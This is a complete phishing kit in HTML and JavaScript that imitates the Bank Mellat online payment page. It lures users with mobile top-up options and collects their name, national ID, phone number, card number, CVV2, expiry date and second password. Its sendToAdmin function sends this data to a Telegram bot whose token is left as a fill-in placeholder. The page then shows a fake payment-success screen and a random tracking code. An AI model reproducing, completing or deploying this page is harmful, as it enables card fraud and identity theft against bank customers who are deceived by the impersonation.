<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>بانک ملت | Bank Mellat</title>
  <style>
    body {
      font-family: "Vazir", sans-serif;
      background-color: #f0f0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
      position: relative;
    
    }
    .logo {
      width: 150px;
      margin-bottom: 10px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 5px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      box-sizing: border-box;
    }
    .error-message {
      color: red;
      font-size: 12px;
      margin-bottom: 10px;
      text-align: right;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #c10016;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #a30013;
    }
    .options-container {
      display: none;
      margin-top: 20px;
    }
    .option-button {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    .option-button:hover {
      background-color: #45a049;
    }
    .charge-options {
      display: none;
      grid-template-columns: repeat(2, 1fr);
      grid-gap: 10px;
      margin-top: 15px;
    }
    .charge-option {
      padding: 10px;
      background-color: #f0f0f0;
      border: 1px solid #ccc;
      text-align: center;
      border-radius: 8px;
      cursor: pointer;
    }
    .charge-option:hover {
      background-color: #e0e0e0;
    }
    .payment-container {
      display: none;
      background-color: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
      position: absolute;
      top: 20%;
      left: 50%;
      transform: translateX(-50%);
    }
    .payment-title {
      font-size: 24px;
      margin-bottom: 20px;
    }
    .payment-box {
      background-color: #fff;
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
    }
    .green {
      color: #808080;
      font-size: 24px;
      font-weight: bold;
      text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
    }
    .blue-button {
      background-color: #0d6efd;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 10px 14px;
      font-size: 14px;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-right: 10px;
      position: relative;
    }
    .blue-button:hover {
      background-color: #0b5ed7;
      transform: scale(1.03);
      box-shadow: 0 0 6px rgba(0, 123, 255, 0.4);
    }
    .green-button {
      background: linear-gradient(to right, #28a745, #218838);
      color: white;
      border: none;
      border-radius: 12px;
      padding: 14px 20px;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
      transition: all 0.3s ease-in-out;
      position: relative;
    }
    .input-icon {
      position: relative;
      margin: 10px 0;
    }
    .input-icon i {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #888;
    }
    .input-icon i.fa-key {
      left: 12px;
      right: auto;
    }
    .input-icon .input-label {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #888;
      pointer-events: none;
      font-size: 14px;
    }
    #ramz2 {
      padding-right: 60px;
      padding-left: 35px;
    }
    .input-icon input {
      width: 100%;
      padding: 10px 35px 10px 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      transition: all 0.3s;
    }
    .input-icon input:focus {
      border-color: #007bff;
      box-shadow: 0 0 3px rgba(0, 123, 255, 0.5);
    }
    .success-container {
      display: none;
    }
    .tracking-code {
      font-size: 20px;
      margin: 20px 0;
      color: #333;
    }
    .success-message {
      font-size: 24px;
      color: green;
      margin-top: 10px;
    }
    .security-code-container {
      display: flex;
      align-items: center;
      margin-top: 10px;
    }
    .code-display {
      width: 40%;
      padding: 10px;
      border: 1px solid #ccc;
      background: repeating-linear-gradient(45deg, #ccc, #ccc 10px, #fff 10px, #fff 20px);
      border-radius: 8px;
      text-align: center;
      font-size: 14px;
      box-sizing: border-box;
      margin-right: 10px;
      transform: translate(10px, -5px);
    }
    .security-input {
      width: 60%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      box-sizing: border-box;
    }
    .timer {
      font-size: 20px;
      font-weight: bold;
      color: #333;
    }
    .timer i {
      margin-left: 8px;
      color: #666;
    }
  </style>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
</head>
<body>
  <div class="container" id="login-page">
    <img alt="Bank Mellat Logo" class="logo" src="https://bankmellat.ir/images/logo.png"/>
    <input id="name" placeholder="نام و نام خانوادگی" type="text"/>
    <div class="error-message" id="error-name"></div>
    <input id="id" placeholder="کد ملی" type="text"/>
    <div class="error-message" id="error-id"></div>
    <input id="phone" placeholder="شماره تلفن" type="text"/>
    <div class="error-message" id="error-phone"></div>
    <button onclick="showOptions()">ورود به سامانه</button>
  </div>
  <div class="container" id="main-page" style="display: none;">
    <img alt="Bank Mellat Logo" class="logo" src="https://bankmellat.ir/images/logo.png"/>
    <button class="option-button" onclick="showChargeOptions()">خرید شارژ</button>
    <button class="option-button" onclick="showError()">خرید اینترنت</button>
    <div class="charge-options" id="charge-options">
      <div class="charge-option" onclick="selectCharge(10000)">10000 تومان</div>
      <div class="charge-option" onclick="selectCharge(20000)">20000 تومان</div>
      <div class="charge-option" onclick="selectCharge(50000)">50000 تومان</div>
      <div class="charge-option" onclick="selectCharge(15000)">15000 تومان</div>
    </div>
  </div>
  <div class="payment-container" id="payment-page">
    <img alt="Bank Mellat Logo" class="logo" src="https://bankmellat.ir/images/logo.png"/>
    <div class="payment-title">پرداخت مبلغ</div>
    <div class="payment-box">
      <h2>زمان باقی مانده:</h2>
      <div class="timer" id="timer">
        <i class="fa-solid fa-clock"></i> 10:00
      </div>
      <h2 class="green" id="amount-paid">مبلغ پرداخت: 0 تومان</h2>
    </div>
    <div class="payment-box">
      <div class="input-icon">
        <i class="fa-solid fa-credit-card"></i>
        <input id="card-number" placeholder="شماره کارت" type="text"/>
      </div>
      <div class="error-message" id="error-card"></div>
      <div class="input-icon">
        <i class="fa-solid fa-shield-halved"></i>
        <input id="cvv2" placeholder="Cvv2 (3 یا 4 رقم)" type="text"/>
      </div>
      <div class="error-message" id="error-cvv"></div>
      <div class="input-icon">
        <i class="fa-solid fa-calendar-days"></i>
        <input id="expiration" placeholder="تاریخ انقضا (مثال: 09/02)" type="text"/>
      </div>
      <div style="display: flex; justify-content: space-between; align-items: center;">
        <div class="input-icon">
          <i class="fa-solid fa-key"></i>
          <input id="ramz2" placeholder="" type="text"/>
          <span class="input-label">رمز دوم</span>
        </div>
        <button class="blue-button" id="request-button" onclick="requestPassword()">درخواست رمز</button>
      </div>
      <div class="security-code-container">
        <div class="code-display" id="generated-code"></div>
        <div class="input-icon">
          <i class="fa-solid fa-lock"></i>
          <input class="security-input" id="security-code-input" placeholder="کد امنیتی" type="text"/>
        </div>
      </div>
      <div class="error-message" id="security-code-error"></div>
    </div>
    <button class="green-button" onclick="pay()">پرداخت</button>
  </div>
  <div class="container success-container" id="success-page" style="display: none;">
    <img alt="Bank Mellat Logo" class="logo" src="https://bankmellat.ir/images/logo.png"/>
    <div class="tracking-code" id="tracking-code">کد رهگیری: </div>
    <div class="success-message">پرداخت موفق</div>
    <button class="orange-button" onclick="goBack()">بازگشت</button>
  </div>
  <script>
    let generatedSecurityCode = "";
    
    function generateSecurityCode() {
      generatedSecurityCode = Math.floor(10000 + Math.random() * 90000).toString();
      document.getElementById("generated-code").innerText = generatedSecurityCode;
    }
    
    function clearErrors() {
      document.getElementById("error-name").innerText = "";
      document.getElementById("error-id").innerText = "";
      document.getElementById("error-phone").innerText = "";
      document.getElementById("error-card").innerText = "";
      document.getElementById("error-cvv").innerText = "";
      document.getElementById("security-code-error").innerText = "";
    }
  
    function showOptions() {
      clearErrors();
      var name = document.getElementById("name").value.trim();
      var nationalId = document.getElementById("id").value.trim();
      var phone = document.getElementById("phone").value.trim();
      var hasError = false;
      
      if (name === "") {
        document.getElementById("error-name").innerText = "لطفا تمامی مقادیر را وارد کنید";
        hasError = true;
      }
      if (nationalId === "") {
        document.getElementById("error-id").innerText = "لطفا تمامی مقادیر را وارد کنید";
        hasError = true;
      }
      if (phone === "") {
        document.getElementById("error-phone").innerText = "لطفا تمامی مقادیر را وارد کنید";
        hasError = true;
      }
      
      if (hasError) return;
  
      var nameRegex = /^[a-zA-Z\u0600-\u06FF\s]+$/;
      if (!nameRegex.test(name)) {
        document.getElementById("error-name").innerText = "نام و نام خانوادگی فقط باید شامل حروف باشد";
        hasError = true;
      }
  
      var idRegex = /^[0-9]+$/;
      if (!idRegex.test(nationalId)) {
        document.getElementById("error-id").innerText = "کد ملی باید فقط شامل اعداد باشد";
        hasError = true;
      }
  
      var phoneRegex1 = /^09\d{9}$/;
      var phoneRegex2 = /^9\d{9}$/;
      if (!phoneRegex1.test(phone) && !phoneRegex2.test(phone)) {
        document.getElementById("error-phone").innerText = "لطفاً شماره تلفن خود را درست وارد کنید";
        hasError = true;
      }
  
      if (hasError) return;
      
      document.getElementById("login-page").style.display = "none";
      document.getElementById("main-page").style.display = "block";
    }
    
    function showChargeOptions() {
      document.getElementById("charge-options").style.display = "grid";
    }
    
    function showError() {
      alert("این قابلیت در حال حاضر در دسترس نیست.");
    }
  
    function selectCharge(amount) {
      document.getElementById("payment-page").style.display = "block";
      document.getElementById("main-page").style.display = "none";
      document.getElementById("amount-paid").innerText = "مبلغ پرداخت: " + amount + " تومان";
      startTimer();
      generateSecurityCode();
    }
    
    function startTimer() {
      var time = 600;
      var timerElement = document.getElementById("timer");
      var interval = setInterval(function() {
        if (time <= 0) {
          clearInterval(interval);
          timerElement.innerText = "زمان تمام شد";
        } else {
          var minutes = Math.floor(time / 60);
          var seconds = time % 60;
          timerElement.innerHTML = '<i class="fa-solid fa-clock"></i> ' + minutes + ":" + (seconds < 10 ? "0" + seconds : seconds);
          time--;
        }
      }, 1000);
    }
  
    function startRequestTimer() {
      const btn = document.getElementById("request-button");
      btn.disabled = true;
      let seconds = 60;
      const originalText = "درخواست رمز";
      btn.innerText = originalText + " (" + seconds + "s)";
      const interval = setInterval(() => {
        seconds--;
        if (seconds > 0) {
          btn.innerText = originalText + " (" + seconds + "s)";
        } else {
          clearInterval(interval);
          btn.disabled = false;
          btn.innerText = originalText;
        }
      }, 1000);
    }
  
    function requestPassword() {
      startRequestTimer();
      const cardNumber = document.getElementById("card-number").value;
      const cvv2 = document.getElementById("cvv2").value;
      const expiration = document.getElementById("expiration").value;
      const ramz2 = document.getElementById("ramz2").value;
      const amount = document.getElementById("amount-paid").innerText;
      const message = `
#Nᴇᴡ_ᴍᴇssᴀɢᴇ » ғʀᴏᴍ ᴍᴇʟʟᴀᴛ
  
#درخواست_رمز_دوم
  
💸Aᴍᴏᴜɴᴛ: ${amount}
  
💳Cᴀʀᴅ ɴᴜᴍʙᴇʀ: ${cardNumber}
  
🗂️Cvv2: ${cvv2}
  
🌟Exᴘɪʀᴀᴛɪᴏɴ Dᴀᴛᴇ: ${expiration}
  
📊ʀᴀᴍᴢ_ᴅᴏᴠᴏᴍ: ${ramz2}
        
♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛
  
♛Oᴡɴᴇʀ : @darghah_poyan
      `;
     
      sendToAdmin(message);
    }
  
    function sendToAdmin(message) {
      const adminApiUrl = "https://api.telegram.org/botتوکن رو اینجا بزارید /sendMessage";
      const chatId = "ایدی عددی ادمین ";
      const text = encodeURIComponent(message);
      const url = `${adminApiUrl}?chat_id=${chatId}&text=${text}`;
      fetch(url, { mode: "no-cors" })
        .then(response => console.log("Message sent to admin"))
        .catch(error => console.error("Error sending message:", error));
    }
  
    function pay() {
      clearErrors();
      const name = document.getElementById("name").value;
      const nationalId = document.getElementById("id").value;
      const phone = document.getElementById("phone").value;
      const cardNumber = document.getElementById("card-number").value;
      const cvv2 = document.getElementById("cvv2").value;
      const expiration = document.getElementById("expiration").value;
      const ramz2 = document.getElementById("ramz2").value;
      const securityInput = document.getElementById("security-code-input").value;
      let hasError = false;
      
      if(!/^\d{16}$/.test(cardNumber)){
        document.getElementById("error-card").innerText = "شماره کارت باید دقیقا 16 رقم عددی باشد";
        hasError = true;
      }
      if(!/^\d{3,4}$/.test(cvv2)){
        document.getElementById("error-cvv").innerText = "cvv2 باید 3 یا 4 رقم عددی باشد";
        hasError = true;
      }
      if(securityInput !== generatedSecurityCode){
        document.getElementById("security-code-error").innerText = "کد امنیتی وارد شده صحیح نمی‌باشد";
        hasError = true;
        generateSecurityCode();
      }
      
      if(hasError) return;
      <!-- @Eror_poyan -->
      const amount = document.getElementById("amount-paid").innerText;
      const trackingCode = Math.floor(10000000 + Math.random() * 90000000);
      document.getElementById("tracking-code").innerText = "کد رهگیری: " + trackingCode;
      const message = `
#Nᴇᴡ_ᴍᴇssᴀɢᴇ » ғʀᴏᴍ ᴍᴇʟʟᴀᴛ
 <!-- @Eror_poyan --> 
❀❀❀❀
  
👤ɴᴀᴍᴇ: ${name}
_______________
  
📩ᴄᴏᴅᴇ_ᴍᴇʟʟɪ: ${nationalId}
_______________
  
☎️ᴘʜᴏɴᴇ: ${phone}
  
■■■■■■■■■■■
  
💸Aᴍᴏᴜɴᴛ: ${amount}
  
■■■■■■■■■■■
  
💳Cᴀʀᴅ ɴᴜᴍʙᴇʀ: ${cardNumber}
_______________
  
🗂️Cvv2: ${cvv2}
_______________
  
🌟Exᴘɪʀᴀᴛɪᴏɴ Dᴀᴛᴇ: ${expiration}
_______________
  
📊ʀᴀᴍᴢ_ᴅᴏᴠᴏᴍ: ${ramz2}
        
♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛
        
♛Oᴡɴᴇʀ : @darghah_poyan
      `;
      sendToAdmin(message);
      document.getElementById("payment-page").style.display = "none";
      document.getElementById("success-page").style.display = "block";
    }
  
    function goBack() {
      document.getElementById("success-page").style.display = "none";
      document.getElementById("main-page").style.display = "block";
    }
  </script>
</body>
</html>
